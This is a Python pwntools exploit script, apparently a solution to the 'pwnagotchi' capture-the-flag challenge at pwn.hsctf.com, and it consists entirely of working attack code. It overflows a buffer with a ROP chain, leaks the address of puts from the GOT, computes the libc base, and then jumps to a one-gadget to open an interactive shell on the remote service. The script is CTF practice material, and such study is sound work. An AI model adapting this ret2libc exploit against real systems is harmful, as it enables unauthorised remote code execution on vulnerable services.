from pwn import *

context.terminal = ['gnome-terminal','-x','sh','-c']
context.arch     = 'amd64'

p = remote('pwn.hsctf.com', 5005)
#p=process('./pwnagotchi')
elf = ELF('./pwnagotchi')

#gdb.attach(p)
print(p.recv())
junk  = 'A' * 20

puts_offset = 0x0809c0
pop_rdi = 0x00000000004009f3
zzz = p64(0x00000000004007e7)
eat = p64(0x0000000000400801)

puts = elf.plt['puts']
puts_got = elf.got['puts']
main = elf.sym['main']

log.info("puts@plt: " + hex(puts))
log.info("puts@got: " + hex(puts_got))
log.info("main: " + hex(main))

payload = junk + p64(pop_rdi) + p64(puts_got) + p64(puts) + zzz + eat + p64(main)

#leaking address of puts
p.clean()
p.sendline(payload)
leak= u64(p.recvuntil("\x7f")[-6:].ljust(8,"\x00"))

libc_base = leak - puts_offset
log.info("libc base: " + hex(libc_base))

#chain rop2 with one-gadget
rop2 = junk + p64(libc_base + 0x4f2c5)
p.recvuntil("Enter your pwnagotchi's name: \n")
p.sendline(rop2)
p.interactive()
